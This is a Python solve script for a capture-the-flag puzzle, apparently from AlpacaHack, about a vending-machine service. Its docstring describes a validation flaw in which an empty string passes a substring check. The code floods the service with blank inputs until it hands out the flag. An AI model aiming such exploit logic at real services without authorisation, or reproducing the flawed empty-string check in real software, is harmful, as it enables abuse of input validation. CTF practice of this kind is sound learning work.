#!/usr/bin/env python3
"""Vending Machine: Revised Version - AlpacaHack Daily (misc).
buy() validates with `'abcde'.find(mark) < 0`, which treats mark as a SUBSTRING,
so the empty string '' passes (find('')==0) and `stock.find('')==0` pops the
first item. Drain the 200 a..e items with empty inputs, leaving only 'f' (flag),
then one more empty input dispenses the flag.
Usage: python3 -I solve.py HOST PORT"""
import re, socket, sys
H, P = sys.argv[1], int(sys.argv[2])
s = socket.create_connection((H, P), timeout=20); s.settimeout(8)
s.sendall(b"\n" * 205 + b"x\n")   # 200 to drain + a few spare -> flag, then exit
data = b""
while True:
    try: ch = s.recv(65536)
    except socket.timeout: break
    if not ch: break
    data += ch
m = re.search(rb"Alpaca\{[^}]*\}", data)
print(m.group(0).decode() if m else "[no flag]\n" + data[-400:].decode(errors="replace"))
